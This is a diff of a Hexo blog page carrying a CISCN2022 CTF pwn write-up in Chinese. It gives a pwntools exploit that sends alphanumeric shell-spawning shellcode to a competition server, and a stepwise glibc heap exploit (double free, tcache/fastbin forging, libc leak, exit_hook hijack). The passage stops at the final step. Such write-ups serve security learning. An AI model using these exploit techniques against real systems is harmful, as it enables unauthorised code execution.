@@ -1,298 +1,89 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="theme-color" content="#f58f98">
+  <title>【CISCN2022】初赛PWN部分writeup | 鷺雨のBlog</title>
+
+  
   <meta name="author" content="Loora1N">
+  
+
+  
+  <meta name="description" content="Blog of Loora1N">
+  
+
+  
+  
   <meta name="keywords" content="">
   
-    <meta name="description" content="ciscn2022初赛pwn方向login-normal和newest-note题解">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【CISCN2022】初赛PWN部分writeup">
-<meta property="og:url" content="http://loora1n.github.io/2022/06/04/ciscn2022/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="ciscn2022初赛pwn方向login-normal和newest-note题解">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png">
-<meta property="article:published_time" content="2022-06-04T01:33:24.324Z">
-<meta property="article:modified_time" content="2022-06-04T01:33:24.324Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png">
-  
-  
-  
-  <title>【CISCN2022】初赛PWN部分writeup - 鷺雨のBlog</title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
 
+  <meta property="og:title" content="【CISCN2022】初赛PWN部分writeup"/>
 
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
+  <meta property="og:site_name" content="鷺雨のBlog"/>
 
   
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <meta property="og:image" content="/favicon.ico"/>
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
-
-
-
-  
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="鷺雨のBlog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
 <body>
-  
+<div class="blog">
+  <div class="content">
 
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">鷺雨のBlog</a>
+    </h1>
+    <p class="site-description"></p>
   </div>
-</nav>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
 
   
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【CISCN2022】初赛PWN部分writeup"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
     
+    <h3 class="article-title"><span>【CISCN2022】初赛PWN部分writeup</span></h3>
     
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-06-04 09:33" pubdate>
-          2022年6月4日 上午
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a target="_blank" href="//2022/06/04/ciscn2022/" rel="bookmark noopener">
+        <time class="entry-date published" datetime="2022-06-04T01:33:24.324Z">
+          2022-06-04
         </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          6.6k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          56 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
+      </a>
+    </span>
   </div>
 
 
-        
-      </div>
+  
 
+  <div class="article-content">
+    <div class="entry">
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【CISCN2022】初赛PWN部分writeup</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="login-normal"><a href="#login-normal" class="headerlink" title="login-normal"></a>login-normal</h1><p>题如其名，一道简单的签到题目，比赛被打烂了。主要在于代码分析，还有可打印shellcode的利用。这里我用的是github上一个大佬的项目AE64，可以用来生成可打印的shellcode，相当好用，强推,链接放在这里。</p>
+        <h1 id="login-normal"><a href="#login-normal" class="headerlink" title="login-normal"></a>login-normal</h1><p>题如其名，一道简单的签到题目，比赛被打烂了。主要在于代码分析，还有可打印shellcode的利用。这里我用的是github上一个大佬的项目AE64，可以用来生成可打印的shellcode，相当好用，强推,链接放在这里。</p>
 <blockquote>
 <p> <a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64">veritas501&#x2F;ae64: basic amd64 alphanumeric shellcode encoder (github.com)</a></p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># io = process(&#x27;./login&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;59.110.105.63&#x27;</span>, <span class="hljs-number">29289</span>)<br>payload = <span class="hljs-string">b&#x27;msg:ro0t\r\nopt:1\r\n&#x27;</span><br><br>io.sendline(payload)<br><br>sc = AE64()<br><br>shellocde = sc.encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;rdx&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;msg:&#x27;</span>+shellocde+<span class="hljs-string">b&#x27;\r\nopt:2\r\n&#x27;</span><br><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./login&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;59.110.105.63&#x27;</span>, <span class="number">29289</span>)</span><br><span class="line">payload = <span class="string">b&#x27;msg:ro0t\r\nopt:1\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">sc = AE64()</span><br><span class="line"></span><br><span class="line">shellocde = sc.encode(asm(shellcraft.sh()),<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;msg:&#x27;</span>+shellocde+<span class="string">b&#x27;\r\nopt:2\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h1><p> 一道堆题目，比赛结束一个多小时才勉强做出来，非常可惜。主要还是不了解新libc的一些进制了解，临时学了下面这篇文章，才有个初步了解。建议先看完这篇文章，再来看我的wp。</p>
 <blockquote>
@@ -313,7 +104,7 @@
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/641a2a24c6634e648470ba9c17bacca3.png" alt="img"></p>
 <h2 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h2><p>我们来看看可以拿到的信息有哪些。首先，由于新libc的机制，我们可以利用uaf漏洞轻松获取heapbase，这里的key是新libc环境下用来xor操作的值。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">key=u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#key</span></span><br><span class="line">heap_base = key&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&#x27;key--&gt;&#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&#x27;heap--&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/1e140e2c358548f7b56cec373b77f0d8.png" alt="img"></p>
 <p>其次，考虑如何泄露libc，由于存在UAF，我们一般可以通过unsortbin来进行泄露。但是问题在于，每个chunk的size都不够大，即便填满tache也只会进入fastbin，而不是unsortbin。在这里，我想到了两个思路</p>
@@ -325,16 +116,16 @@
 </ul>
 <p>下面我们采用第二种思路</p>
 <h3 id="一、得到heapbase"><a href="#一、得到heapbase" class="headerlink" title="一、得到heapbase"></a>一、得到heapbase</h3><p>开始先申请几个chunk，多申请的那几个是用来扩充可控堆区域的大小，为伪造的大chunk提供空间，不然覆盖进topchunk程序会崩掉。这个步骤比较简单，前面也谈到了不过多赘述</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">key=u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#key</span></span><br><span class="line">heap_base = key&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&#x27;key--&gt;&#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&#x27;heap--&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
 
 <h3 id="二、伪造fastbin链"><a href="#二、伪造fastbin链" class="headerlink" title="二、伪造fastbin链"></a>二、伪造fastbin链</h3><p>这里我们先填满tcache,然后free 7号chunk进入fastbin，结构入下图所示。由于新的libc机制，这里的fd指针都进行了异或操作，所以看起来并不是很直观。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment">## double free</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/e5ae010babec4989a45fa29018da4cb4.png" alt="img"></p>
 <p>然后申请chunk，此时从tcache中取出最后一个chunk。由于此时tcache中仅剩6个chunk，我们再对7号chunk进行free时，它便会放入tcache中。通过这样的doublefree我们构造了一个即在Tcache又在fastbin的chunk，如下所示。</p>
 <p><img src="https://img-blog.csdnimg.cn/839aa64c464c4ab1a42b524daf40f730.png" alt="img"></p>
 <p> 接下来我们便可以开始构造fake fastbin，需要注意的是fastbin中的fd指针同样需要异或处理，我们可以得到如下结构,此时tcache链长度为0，fastbin的长度为7.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">10</span>,p64(key^(heap_base+<span class="number">0x480</span>)))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x440</span>)))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x400</span>)))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x3a0</span>)))</span><br><span class="line">add(<span class="number">3</span>,p64(key^(heap_base+<span class="number">0x380</span>)))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x340</span>)))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key)) <span class="comment">##7</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/5e6f8e3dac8945b28ddf8b4794c3395f.png" alt="img"></p>
 <h3 id="三、伪造tcache链并泄露libc"><a href="#三、伪造tcache链并泄露libc" class="headerlink" title="三、伪造tcache链并泄露libc"></a>三、伪造tcache链并泄露libc</h3><p> 此时我们调用add()，就会触发fastbin和tcache的stash机制，此时其余6个chunk便会扔到tcache中，其结构如下所示</p>
@@ -347,442 +138,60 @@
 <p> fastbin最大为0x410,这里用0x441刚好可以对齐chunk</p>
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/60c6e7ed5e2d4633b5226a7183ab38d7.png" alt="img"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## change head of 4 </span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x441</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">exit_hook = libc_base + <span class="number">0x21a6c8</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line">success(<span class="string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="built_in">hex</span>(exit_hook))</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p> 这里没有选择freehook或者mallochook是因为没有合适的onegadget，选择劫持exithook</p>
 </blockquote>
 <h3 id="四、劫持exithook"><a href="#四、劫持exithook" class="headerlink" title="四、劫持exithook"></a>四、劫持exithook</h3><p>由于我们在tcache链里折叠了两个chunk这样便可以轻松的更改freechunk的内容，劫持exithook为ongadget然后结束程序便可，最终结构如下</p>
